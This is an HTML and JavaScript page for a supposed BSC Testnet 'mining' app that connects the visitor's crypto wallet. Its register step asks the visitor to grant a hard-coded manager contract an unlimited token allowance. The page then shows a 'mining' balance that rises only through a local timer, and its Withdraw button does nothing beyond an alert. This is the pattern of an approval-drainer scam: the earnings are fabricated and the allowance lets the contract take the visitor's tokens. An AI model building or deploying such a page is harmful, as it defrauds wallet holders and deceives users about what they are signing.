<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Mining Testnet Fix</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        :root { --bg: #0f172a; --card: #1e293b; --primary: #38bdf8; --text: #f8fafc; --success: #22c55e; }
        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .dark-mode { background: var(--bg); color: var(--text); }
        .card { background: white; padding: 25px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; }
        .dark-mode .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); color: white; }
        .btn { padding: 15px; font-size: 16px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .trust-btn { background: #3375bb; color: white; }
        #loginView, #dashboardView, #miningView { display: none; }
        .mining-circle { width: 140px; height: 140px; margin: 15px auto; border-radius: 50%; border: 4px dashed var(--primary); display: flex; justify-content: center; align-items: center; animation: spin 10s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .status { font-size: 12px; color: #ff9800; margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <div id="loginView" style="display: block;">
        <h2>BSC Testnet Mining</h2>
        <button class="btn trust-btn" onclick="openTrust()">Open Trust Wallet</button>
        <p id="msg" class="status"></p>
    </div>

    <div id="dashboardView">
        <h2>Registration</h2>
        <p id="addr" style="font-size: 10px; background: #eee; padding: 10px; border-radius: 8px; color: #333;"></p>
        <button id="regBtn" class="btn" style="background: #4CAF50; color: white;" onclick="register()">Approve & Register</button>
        <p id="txStatus" style="font-size: 11px; color: blue; margin-top: 10px;"></p>
    </div>

    <div id="miningView">
        <div class="mining-circle">
            <div style="animation: spin-rev 10s linear infinite; text-align: center;">
                <small>LIVE</small>
                <div id="liveBalance" style="font-size: 20px; font-weight: bold; color: var(--primary);">$1.00000</div>
            </div>
        </div>
        <p>Mining Rate: 1% / Hour</p>
        <button class="btn" style="background: #38bdf8; color: white;" onclick="alert('Withdraw logic ready')">Withdraw</button>
    </div>
</div>

<script>
    const TESTNET_ID = 97;
    const MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
    const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
    let signer;
    let balance = 1.00000;

    function openTrust() {
        window.location.href = "trust://open_url?url=" + encodeURIComponent(window.location.href);
    }

    async function init() {
        if (window.ethereum) {
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const { chainId } = await provider.getNetwork();
                
                if (chainId !== TESTNET_ID) {
                    document.getElementById('msg').innerText = "Network Error: Switch to BSC Testnet!";
                    return;
                }

                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                const address = await signer.getAddress();

                document.getElementById('loginView').style.display = 'none';
                document.getElementById('dashboardView').style.display = 'block';
                document.getElementById('addr').innerText = address;
            } catch (e) { console.error(e); }
        }
    }

    setInterval(() => { if (window.ethereum && !signer) init(); }, 2000);

    async function register() {
        const btn = document.getElementById('regBtn');
        const status = document.getElementById('txStatus');
        try {
            btn.disabled = true;
            status.innerText = "Step 1: Approving... (Check Wallet)";
            
            const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
            const mCon = new ethers.Contract(MANAGER, ["function register() external"], signer);

            // Manual Gas Settings taaki error na aaye
            const tx1 = await tCon.approve(MANAGER, ethers.constants.MaxUint256, {
                gasLimit: 100000 
            });
            await tx1.wait();

            status.innerText = "Step 2: Registering... (Check Wallet)";
            const tx2 = await mCon.register({
                gasLimit: 200000
            });
            await tx2.wait();

            startMining();
        } catch (e) {
            console.error(e);
            alert("Error: Transaction failed. Please check if you have enough tBNB and the Contract is active.");
            btn.disabled = false;
            status.innerText = "";
        }
    }

    function startMining() {
        document.body.classList.add('dark-mode');
        document.getElementById('dashboardView').style.display = 'none';
        document.getElementById('miningView').style.display = 'block';
        setInterval(() => {
            balance += (0.01 / 3600);
            document.getElementById('liveBalance').innerText = "$" + balance.toFixed(5);
        }, 1000);
    }
</script>
</body>
</html>
